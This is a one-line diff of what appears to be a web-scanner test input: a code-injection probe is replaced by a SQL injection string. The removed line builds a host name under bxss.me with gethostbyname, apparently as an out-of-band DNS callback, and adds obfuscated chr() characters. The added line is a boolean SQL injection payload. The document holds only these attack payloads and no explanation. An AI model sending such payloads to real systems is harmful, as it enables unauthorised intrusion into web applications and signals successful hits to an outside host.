@@ -1,1 +1,1 @@
-gethostbyname(lc('hitti'.'nkgpjvam55817.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(114).chr(78).chr(105).chr(89)
+-1' OR 2+285-285-1=0+0+0+1 or 'm4ydak4L'='
